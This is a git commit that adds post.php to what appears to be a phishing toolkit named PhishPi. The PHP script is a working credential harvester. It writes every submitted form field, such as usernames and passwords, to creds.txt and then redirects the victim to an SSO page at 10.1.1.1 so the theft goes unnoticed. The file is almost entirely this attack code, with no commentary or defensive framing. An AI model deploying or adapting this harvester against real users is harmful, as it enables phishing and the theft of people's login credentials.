20adfc8d3c197d7c36a4fbf38354ec174111351b
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-05-26 11:14:04 -0400

    Add files via upload

---
+++ PhishPi/Resources/post.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location:http://10.1.1.1/sso.html');
+$handle = fopen("creds.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+
